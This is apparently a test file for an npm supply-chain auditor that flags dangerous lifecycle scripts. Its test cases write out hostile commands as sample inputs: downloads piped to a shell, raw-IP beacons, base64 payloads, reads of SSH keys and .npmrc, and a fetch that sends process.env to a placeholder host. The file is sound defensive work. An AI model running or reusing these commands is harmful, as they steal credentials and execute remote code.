import { expect, test } from "bun:test";
import { auditScript, auditScripts, LIFECYCLE_SCRIPTS } from "../../src/audit/scripts.ts";
import type { AuditFs } from "../../src/audit/types.ts";

const ruleFor = (command: string) =>
  auditScript("pkg", "preinstall", command, "package.json").map((f) => f.rule);

const cases: Array<[string, string, string]> = [
  ["curl piped to sh", "curl -s https://x.example/p.sh | sh", "script_pipes_download_to_shell"],
  ["wget piped to bash", "wget -qO- https://x.example/p | bash", "script_pipes_download_to_shell"],
  ["raw ip endpoint", "curl http://185.62.57.1/beacon", "script_raw_ip_endpoint"],
  ["base64 shell decode", "echo aGk= | base64 -d > /tmp/x", "script_base64_payload"],
  ["base64 in node", "node -p \"Buffer.from(x, 'base64')\"", "script_base64_payload"],
  ["inline node eval", "node -e \"require('./x')\"", "script_inline_node_eval"],
  ["ssh key access", "cat ~/.ssh/id_rsa", "script_credential_path_access"],
  ["npmrc access", "cp ~/.npmrc /tmp/x", "script_credential_path_access"],
  [
    "env exfiltration",
    "node -e \"fetch('http://x.example',{body:process.env})\"",
    "script_env_exfiltration",
  ],
];

for (const [name, command, rule] of cases) {
  test(`script audit flags ${name}`, () => {
    expect(ruleFor(command)).toContain(rule);
  });
}

test("the Shai-Hulud preinstall shape is blocked, not merely noted", () => {
  const findings = auditScript(
    "worm",
    "preinstall",
    "node setup_bun.js && node bun_environment.js",
    "package.json",
  );
  expect(findings.every((f) => f.rule === "script_lifecycle_present")).toBe(true);
  expect(findings[0]?.level).toBe("warn");

  const armed = auditScript(
    "worm",
    "preinstall",
    "curl -s http://185.62.57.1/setup_bun.js | node",
    "package.json",
  );
  expect(armed.some((f) => f.level === "block")).toBe(true);
});

test("a benign lifecycle script is reported once, as a warning", () => {
  const findings = auditScript("pkg", "postinstall", "node ./scripts/build.js", "package.json");
  expect(findings).toHaveLength(1);
  expect(findings[0]?.rule).toBe("script_lifecycle_present");
  expect(findings[0]?.level).toBe("warn");
});

test("a dangerous script does not also emit the generic lifecycle warning", () => {
  const rules = ruleFor("curl http://1.2.3.4/x | sh");
  expect(rules).not.toContain("script_lifecycle_present");
});

function fsWith(files: Record<string, string>, globbed: string[] = []): AuditFs {
  return {
    exists: (path) => path in files,
    readFile: (path) => {
      const key = Object.keys(files)
        .sort((a, b) => b.length - a.length)
        .find((name) => path.endsWith(name));
      if (!key) throw new Error(`ENOENT ${path}`);
      return files[key] as string;
    },
    glob: () => globbed,
  };
}

test("auditScripts walks the root manifest and installed packages", () => {
  const report = auditScripts(
    "/proj",
    fsWith(
      {
        "package.json": JSON.stringify({ name: "root", scripts: { build: "tsc" } }),
        "node_modules/evil/package.json": JSON.stringify({
          name: "evil",
          scripts: { preinstall: "curl http://9.9.9.9/x | sh" },
        }),
      },
      ["node_modules/evil/package.json"],
    ),
  );
  expect(report.scanned).toBe(2);
  expect(report.findings.map((f) => f.rule)).toContain("script_pipes_download_to_shell");
  expect(report.notes).toEqual([]);
});

test("non-lifecycle scripts like build and test are ignored", () => {
  const report = auditScripts(
    "/proj",
    fsWith({
      "package.json": JSON.stringify({
        name: "root",
        scripts: { build: "curl http://1.2.3.4/x | sh", test: "bun test" },
      }),
    }),
  );
  expect(report.findings).toEqual([]);
});

test("a missing node_modules is noted so a clean result is not misread", () => {
  const report = auditScripts("/proj", fsWith({ "package.json": '{"name":"root"}' }));
  expect(report.notes[0]).toContain("node_modules not installed");
});

test("an unreadable manifest is skipped rather than failing the scan", () => {
  const report = auditScripts("/proj", {
    ...fsWith({}),
    glob: () => ["node_modules/x/package.json"],
  });
  expect(report.scanned).toBe(0);
  expect(report.findings).toEqual([]);
});

test("every audited hook is a real npm lifecycle hook", () => {
  expect(LIFECYCLE_SCRIPTS).toEqual([
    "preinstall",
    "install",
    "postinstall",
    "prepare",
    "prepublish",
  ]);
});
